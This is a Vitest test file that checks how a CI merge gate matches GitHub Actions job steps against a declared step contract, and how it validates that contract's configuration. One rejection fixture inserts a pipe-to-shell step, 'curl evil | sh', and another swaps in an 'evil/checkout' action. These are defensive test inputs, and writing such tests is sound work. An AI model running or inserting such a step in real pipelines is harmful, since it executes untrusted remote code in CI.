import { describe, expect, test, vi } from "vitest";
import type { CheckRequest } from "./check-executor.js";
import {
  GITHUB_CHECK_NAMES,
  GITHUB_WORKFLOW_STEPS,
  GithubCheckPoller,
  inspectGithubCheckRun,
} from "./github-check-poller.js";
import type { GithubJob, GithubRun } from "./github-client.js";
import { githubDispatchIdentity } from "./github-dispatch-discovery.js";
import {
  type GithubStepContract,
  matchesGithubStepContract,
  parseGithubStepContract,
} from "./github-step-contract.js";
import type { GithubMergeGateExecutor } from "./merge-gate-executors.js";

/** merge-gate.yaml `step_contract` for sensen-godot's cardigan-check.yml. */
const SENSEN_RAW = {
  steps: [
    "Initialize containers",
    { uses: "actions/checkout" },
    { uses: "pnpm/action-setup" },
    { uses: "actions/setup-node" },
    "install",
    "build",
    "test",
    "lint",
    "deps",
    "e2e",
  ],
  post_steps: [
    { uses: "actions/setup-node" },
    { uses: "pnpm/action-setup" },
    { uses: "actions/checkout" },
    "Stop containers",
  ],
};
const SENSEN = parseGithubStepContract(SENSEN_RAW);
/**
 * Synthesized from the incident description and GitHub's generated-name
 * rules (services + unnamed uses steps); not a replay of a sensen run.
 */
const SENSEN_MAIN = [
  "Set up job",
  "Initialize containers",
  "Run actions/checkout@v4",
  "Run pnpm/action-setup@v4",
  "Run actions/setup-node@v4",
  ...GITHUB_CHECK_NAMES,
];
const SENSEN_POST = [
  "Post Run actions/setup-node@v4",
  "Post Run pnpm/action-setup@v4",
  "Post Run actions/checkout@v4",
  "Stop containers",
  "Complete job",
];
const CARDIGAN_MAIN = ["Set up job", ...GITHUB_WORKFLOW_STEPS];
const CARDIGAN_POST = [
  "Post Setup Node",
  "Post Checkout candidate",
  "Complete job",
];

const RUN_ID = 45034043507;
const run: GithubRun = {
  id: RUN_ID,
  run_attempt: 1,
  path: ".github/workflows/cardigan-check.yml",
  event: "workflow_dispatch",
  head_branch: "main",
  head_sha: "a".repeat(40),
  actor: { login: "fixture[bot]" },
  display_title: `cardigan/C-16/D-1/attempt/merge_check/${"b".repeat(40)}/${"c".repeat(40)}`,
  html_url: `https://github.com/fixture/sensen/actions/runs/${RUN_ID}`,
  created_at: "2026-11-22T00:00:00Z",
  status: "completed",
  conclusion: "success",
};
const request: CheckRequest = {
  project: "sensen",
  kind: "merge_check",
  sha: "b".repeat(40),
  tree: "c".repeat(40),
  checks: GITHUB_CHECK_NAMES.map((name) => ({ name, run: "true" })),
};

/** Main steps numbered contiguously; post steps after a GitHub-style gap. */
function jobOf(
  main: readonly string[],
  post: readonly string[],
  conclusions: Record<string, string> = {},
  overrides: Partial<GithubJob> = {},
): GithubJob {
  const steps = [
    ...main.map((name, index) => ({ name, number: index + 1 })),
    ...post.map((name, index) => ({ name, number: main.length + 14 + index })),
  ].map((step) => ({
    ...step,
    status: "completed",
    conclusion: conclusions[step.name] ?? "success",
  }));
  const failed = Object.values(conclusions).some((c) => c !== "success");
  return {
    id: 9001,
    run_id: RUN_ID,
    run_attempt: 1,
    head_sha: run.head_sha,
    name: "check",
    status: "completed",
    conclusion: failed ? "failure" : "success",
    steps,
    ...overrides,
  };
}
function inspect(
  job: GithubJob,
  stepContract?: GithubStepContract,
  conclusion = job.conclusion,
) {
  const completed = { ...run, conclusion };
  return inspectGithubCheckRun({
    client: {
      run: vi.fn(async () => completed),
      jobs: vi.fn(async () => [job]),
    },
    runId: RUN_ID,
    expectedRun: completed,
    request,
    stepContract,
  });
}
const rejected = {
  status: "failed",
  checks: [],
  reason: "GitHub 检查步骤合同不符，拒绝通过",
};

describe("C-592: Cardigan default contract is unchanged", () => {
  test("Cardigan's own job passes without a contract", async () => {
    expect((await inspect(jobOf(CARDIGAN_MAIN, CARDIGAN_POST))).status).toBe(
      "passed",
    );
    expect(
      (await inspect(jobOf(CARDIGAN_MAIN, ["Post Checkout candidate"]))).status,
    ).toBe("passed");
  });
  test.each([
    ["reversed post steps", CARDIGAN_MAIN, [...CARDIGAN_POST].reverse()],
    ["Stop containers", CARDIGAN_MAIN, ["Stop containers", ...CARDIGAN_POST]],
    [
      "missing hc",
      CARDIGAN_MAIN.filter((s) => s !== "Install and verify hc"),
      CARDIGAN_POST,
    ],
  ])("still rejects %s", async (_label, main, post) => {
    expect(await inspect(jobOf(main, post))).toMatchObject(rejected);
  });
});

describe("C-592: configured step contract", () => {
  test("sensen's synthesized job shape (from the incident description) passes with its configured contract", async () => {
    const result = await inspect(jobOf(SENSEN_MAIN, SENSEN_POST), SENSEN);
    expect(result.status).toBe("passed");
    expect(result.checks.map((c) => [c.name, c.status])).toEqual(
      GITHUB_CHECK_NAMES.map((name) => [name, "passed"]),
    );
  });

  test("without a contract the same sensen job is still rejected (previous behavior)", async () => {
    expect(await inspect(jobOf(SENSEN_MAIN, SENSEN_POST))).toMatchObject(
      rejected,
    );
  });

  test("check conclusions map from the actual steps", async () => {
    const result = await inspect(
      jobOf(SENSEN_MAIN, SENSEN_POST, {
        test: "failure",
        lint: "skipped",
        deps: "skipped",
        e2e: "skipped",
      }),
      SENSEN,
    );
    expect(result.status).toBe("failed");
    expect(result.checks.map((c) => c.status)).toEqual([
      "passed",
      "passed",
      "failed",
      "not_run",
      "not_run",
      "not_run",
    ]);
    expect(result.logSource).toEqual({ url: run.html_url, jobId: 9001 });
    expect(result).not.toHaveProperty("recovered");
    expect(result).not.toHaveProperty("caseTimeoutsManaged");

    const timedOut = await inspect(
      jobOf(SENSEN_MAIN, SENSEN_POST, { e2e: "timed_out" }),
      SENSEN,
    );
    expect(timedOut.status).toBe("timed_out");
    expect(timedOut.checks.at(-1)).toMatchObject({ status: "timed_out" });
  });

  test("failed infrastructure steps fail the check and are named", async () => {
    const result = await inspect(
      jobOf(SENSEN_MAIN, SENSEN_POST, {
        "Initialize containers": "failure",
        install: "skipped",
        build: "skipped",
        test: "skipped",
        lint: "skipped",
        deps: "skipped",
        e2e: "skipped",
      }),
      SENSEN,
    );
    expect(result).toMatchObject({
      status: "failed",
      failedGithubStep: "Initialize containers",
    });
  });

  test("post steps are optional but ordered; Set up job/Complete job optional", async () => {
    for (const post of [
      [],
      ["Stop containers"],
      ["Post Run actions/checkout@v4", "Complete job"],
      ["Post Run actions/setup-node@v4", "Stop containers"],
    ])
      expect((await inspect(jobOf(SENSEN_MAIN, post), SENSEN)).status).toBe(
        "passed",
      );
    expect(
      (await inspect(jobOf(SENSEN_MAIN.slice(1), SENSEN_POST), SENSEN)).status,
    ).toBe("passed");
  });

  test.each([
    ["missing check", SENSEN_MAIN.filter((s) => s !== "deps"), SENSEN_POST],
    [
      "undeclared extra main step",
      [...SENSEN_MAIN.slice(0, 6), "curl evil | sh", ...SENSEN_MAIN.slice(6)],
      SENSEN_POST,
    ],
    ["undeclared trailing step", [...SENSEN_MAIN, "deploy"], SENSEN_POST],
    [
      "undeclared post step",
      SENSEN_MAIN,
      ["Post Run actions/cache@v4", ...SENSEN_POST],
    ],
    ["post steps out of order", SENSEN_MAIN, [...SENSEN_POST].reverse()],
    [
      "post ref differs from main ref",
      SENSEN_MAIN,
      ["Post Run actions/checkout@v3", "Stop containers"],
    ],
    [
      "different action than declared",
      SENSEN_MAIN.map((s) =>
        s === "Run actions/checkout@v4" ? "Run evil/checkout@v4" : s,
      ),
      SENSEN_POST,
    ],
    [
      "action subpath than declared",
      SENSEN_MAIN.map((s) =>
        s === "Run actions/checkout@v4" ? "Run actions/checkout/x@v4" : s,
      ),
      SENSEN_POST,
    ],
    [
      "missing declared infrastructure step",
      SENSEN_MAIN.filter((s) => s !== "Initialize containers"),
      SENSEN_POST,
    ],
    [
      "checks reordered",
      [...SENSEN_MAIN.slice(0, 5), "build", "install", ...SENSEN_MAIN.slice(7)],
      SENSEN_POST,
    ],
    ["duplicated check", [...SENSEN_MAIN, "test"], SENSEN_POST],
    ["Cardigan's own job shape", CARDIGAN_MAIN, CARDIGAN_POST],
  ])("rejects %s", async (_label, main, post) => {
    expect(await inspect(jobOf(main, post), SENSEN)).toMatchObject(rejected);
  });

  test.each([
    ["job name", { name: "build" }],
    ["job run", { run_id: RUN_ID + 1 }],
    ["job attempt", { run_attempt: 2 }],
    ["job head", { head_sha: "d".repeat(40) }],
    ["job status", { status: "in_progress" }],
  ] as const)("rejects a mismatched %s", async (_label, overrides) => {
    expect(
      await inspect(jobOf(SENSEN_MAIN, SENSEN_POST, {}, overrides), SENSEN),
    ).toMatchObject(rejected);
  });

  test("rejects non-contiguous main numbering or incomplete steps", async () => {
    const job = jobOf(SENSEN_MAIN, SENSEN_POST);
    const gap = {
      ...job,
      steps: job.steps.map((s, i) => (i === 3 ? { ...s, number: 99 } : s)),
    };
    expect(await inspect(gap, SENSEN)).toMatchObject(rejected);
    const running = {
      ...job,
      steps: job.steps.map((s, i) =>
        i === 2 ? { ...s, status: "in_progress", conclusion: null } : s,
      ),
    };
    expect(await inspect(running, SENSEN)).toMatchObject(rejected);
  });

  test("run identity mismatch is still unavailable before steps are read", async () => {
    const jobs = vi.fn(async () => [jobOf(SENSEN_MAIN, SENSEN_POST)]);
    const result = await inspectGithubCheckRun({
      client: {
        run: vi.fn(async () => ({ ...run, head_sha: "e".repeat(40) })),
        jobs,
      },
      runId: RUN_ID,
      expectedRun: run,
      request,
      stepContract: SENSEN,
    });
    expect(result.status).toBe("executor_unreachable");
    expect(jobs).not.toHaveBeenCalled();
  });

  test("the request must still carry exactly the six checks", async () => {
    const result = await inspectGithubCheckRun({
      client: {
        run: vi.fn(async () => run),
        jobs: vi.fn(async () => [jobOf(SENSEN_MAIN, SENSEN_POST)]),
      },
      runId: RUN_ID,
      expectedRun: run,
      request: { ...request, checks: request.checks.slice(0, 5) },
      stepContract: SENSEN,
    });
    expect(result).toMatchObject(rejected);
  });

  test("card tier e2e skip stays intentional under a configured contract", async () => {
    const result = await inspectGithubCheckRun({
      client: {
        run: vi.fn(async () => run),
        jobs: vi.fn(async () => [
          jobOf(
            SENSEN_MAIN,
            SENSEN_POST,
            { e2e: "skipped" },
            {
              conclusion: "success",
            },
          ),
        ]),
      },
      runId: RUN_ID,
      expectedRun: run,
      request: { ...request, mergeTier: "card" },
      stepContract: SENSEN,
    });
    expect(result.status).toBe("passed");
    expect(result.checks.at(-1)).toMatchObject({
      status: "skipped",
      reason: "card_tier",
    });
  });

  test("Cardigan receipt names have no meaning in a configured contract", () => {
    const contract = parseGithubStepContract({
      steps: [...GITHUB_CHECK_NAMES, "Recovered something"],
    });
    expect(
      matchesGithubStepContract(
        [...GITHUB_CHECK_NAMES, "Recovered something"],
        contract,
      ),
    ).toBe(true);
  });

  test("the poller applies its executor's contract", async () => {
    const external = {
      provider: "github" as const,
      run_id: RUN_ID,
      run_attempt: 1 as const,
      html_url: run.html_url,
      workflow_sha: run.head_sha,
    };
    const results = [];
    for (const stepContract of [undefined, SENSEN]) {
      const client = {
        pollRuns: vi.fn(async () => ({
          unchanged: false,
          runs: [run],
          etag: '"e"',
        })),
        run: vi.fn(async () => run),
        jobs: vi.fn(async () => [jobOf(SENSEN_MAIN, SENSEN_POST)]),
        cancel: vi.fn(async () => {}),
        jobLog: vi.fn(async () => {}),
      };
      const poller = new GithubCheckPoller({
        client: client as never,
        stepContract,
      });
      poller.register(external, request, run);
      const result = poller.poll(external);
      await poller.tick();
      results.push((await result).status);
    }
    expect(results).toEqual(["failed", "passed"]);
  });
});

describe("C-592: step_contract validation", () => {
  test("parses names, uses and optional post steps", () => {
    expect(SENSEN.steps[1]).toEqual({ uses: "actions/checkout" });
    expect(SENSEN.postSteps.at(-1)).toEqual({ name: "Stop containers" });
    expect(
      parseGithubStepContract({ steps: [...GITHUB_CHECK_NAMES] }).postSteps,
    ).toEqual([]);
    expect(
      parseGithubStepContract({
        steps: [{ uses: "github/codeql-action/init" }, ...GITHUB_CHECK_NAMES],
      }).steps[0],
    ).toEqual({ uses: "github/codeql-action/init" });
  });

  test.each([
    ["not an object", []],
    ["unknown key", { ...SENSEN_RAW, job: "check" }],
    ["missing steps", { post_steps: [] }],
    ["empty steps", { steps: [] }],
    [
      "too many steps",
      { steps: Array.from({ length: 65 }, (_, i) => `s${i}`) },
    ],
    ["post_steps not a list", { ...SENSEN_RAW, post_steps: "Stop containers" }],
    ["missing check", { steps: GITHUB_CHECK_NAMES.slice(1) }],
    ["duplicate check", { steps: [...GITHUB_CHECK_NAMES, "test"] }],
    ["duplicate infra name", { steps: ["a", "a", ...GITHUB_CHECK_NAMES] }],
    ["empty name", { steps: ["", ...GITHUB_CHECK_NAMES] }],
    ["padded name", { steps: [" a", ...GITHUB_CHECK_NAMES] }],
    ["control char", { steps: ["a\nb", ...GITHUB_CHECK_NAMES] }],
    ["non-string entry", { steps: [42, ...GITHUB_CHECK_NAMES] }],
    ["Set up job in steps", { steps: ["Set up job", ...GITHUB_CHECK_NAMES] }],
    [
      "Complete job in steps",
      { steps: [...GITHUB_CHECK_NAMES, "Complete job"] },
    ],
    ["Post step in main", { steps: ["Post x", ...GITHUB_CHECK_NAMES] }],
    [
      "uses with ref",
      { steps: [{ uses: "actions/checkout@v4" }, ...GITHUB_CHECK_NAMES] },
    ],
    [
      "uses without owner",
      { steps: [{ uses: "checkout" }, ...GITHUB_CHECK_NAMES] },
    ],
    ["uses traversal", { steps: [{ uses: "a/../b" }, ...GITHUB_CHECK_NAMES] }],
    [
      "uses extra key",
      { steps: [{ uses: "a/b", name: "x" }, ...GITHUB_CHECK_NAMES] },
    ],
    [
      "duplicate uses",
      { steps: [{ uses: "a/b" }, { uses: "a/b" }, ...GITHUB_CHECK_NAMES] },
    ],
    ["check as post", { steps: [...GITHUB_CHECK_NAMES], post_steps: ["e2e"] }],
    [
      "main name as post",
      { steps: ["x", ...GITHUB_CHECK_NAMES], post_steps: ["x"] },
    ],
    [
      "Complete job as post",
      { steps: [...GITHUB_CHECK_NAMES], post_steps: ["Complete job"] },
    ],
    [
      "undeclared post uses",
      { steps: [...GITHUB_CHECK_NAMES], post_steps: [{ uses: "a/b" }] },
    ],
    [
      "duplicate post",
      { steps: [...GITHUB_CHECK_NAMES], post_steps: ["x", "x"] },
    ],
  ])("rejects %s", (_label, raw) => {
    expect(() => parseGithubStepContract(raw)).toThrow(/step_contract/u);
  });

  test("V-2917: rejects one display name declared through both uses and an exact name", () => {
    const checks = [...GITHUB_CHECK_NAMES];
    for (const raw of [
      // post exact name equal to the main uses step's generated name
      {
        steps: [{ uses: "actions/checkout" }, ...checks],
        post_steps: ["Run actions/checkout@v4"],
      },
      // main mixes uses and its exact generated name
      {
        steps: [
          { uses: "actions/checkout" },
          ...checks,
          "Run actions/checkout@v4",
        ],
      },
      // post mixes uses and its exact Post name
      {
        steps: [{ uses: "actions/checkout" }, ...checks],
        post_steps: [
          { uses: "actions/checkout" },
          "Post Run actions/checkout@v4",
        ],
      },
      // exact Post name for a uses step in main
      {
        steps: [{ uses: "actions/checkout" }, ...checks],
        post_steps: ["Post Run actions/checkout@v4"],
      },
    ])
      expect(() => parseGithubStepContract(raw)).toThrow(/生成名重复/u);
    // Non-conflicting mixes stay valid.
    expect(
      parseGithubStepContract({
        steps: [
          { uses: "actions/checkout" },
          "Run actions/checkout-extra@v1",
          "Run pnpm install",
          ...checks,
        ],
        post_steps: [{ uses: "actions/checkout" }, "Post Setup Node"],
      }).steps,
    ).toHaveLength(9);
  });

  test("V-2917: duplicate display names never pass, even with an unvalidated contract", async () => {
    const contract: GithubStepContract = {
      steps: [
        { uses: "actions/checkout" },
        ...GITHUB_CHECK_NAMES.map((name) => ({ name })),
      ],
      postSteps: [{ name: "Run actions/checkout@v4" }],
    };
    const main = ["Run actions/checkout@v4", ...GITHUB_CHECK_NAMES];
    expect(matchesGithubStepContract(main, contract)).toBe(true);
    expect(
      matchesGithubStepContract([...main, "Run actions/checkout@v4"], contract),
    ).toBe(false);
    expect(
      await inspect(
        jobOf(["Set up job", ...main], ["Run actions/checkout@v4"]),
        contract,
      ),
    ).toMatchObject(rejected);
    const mixed: GithubStepContract = {
      steps: [
        { uses: "actions/checkout" },
        { name: "Run actions/checkout@v4" },
        ...GITHUB_CHECK_NAMES.map((name) => ({ name })),
      ],
      postSteps: [],
    };
    expect(
      matchesGithubStepContract(
        [
          "Run actions/checkout@v4",
          "Run actions/checkout@v4",
          ...GITHUB_CHECK_NAMES,
        ],
        mixed,
      ),
    ).toBe(false);
  });

  test("an explicit null post_steps is a field error; omission defaults to empty", () => {
    expect(() =>
      parseGithubStepContract({
        steps: [...GITHUB_CHECK_NAMES],
        post_steps: null,
      }),
    ).toThrow(/post_steps/u);
  });

  test("errors never echo configured values", () => {
    expect(() =>
      parseGithubStepContract({ steps: ["secret\u0000value"] }),
    ).toThrow(
      expect.objectContaining({
        message: expect.not.stringContaining("secret"),
      }),
    );
  });

  test("the contract is result policy, not dispatch identity", () => {
    const config: GithubMergeGateExecutor = {
      name: "github-actions-sensen",
      type: "github",
      repo: "fixture/sensen",
      workflow: ".github/workflows/cardigan-check.yml",
      appId: 1,
      installationId: 2,
      privateKeyFile: "/x/key",
      botLogin: "fixture[bot]",
      maxConcurrent: 1,
    };
    const checkRequest = { ...request, attempt: "attempt-1" };
    const context = { card: "C-16", delivery: "D-1", baselineBranch: "main" };
    expect(
      githubDispatchIdentity(checkRequest, context, {
        ...config,
        stepContract: SENSEN,
      }).key,
    ).toBe(githubDispatchIdentity(checkRequest, context, config).key);
  });
});
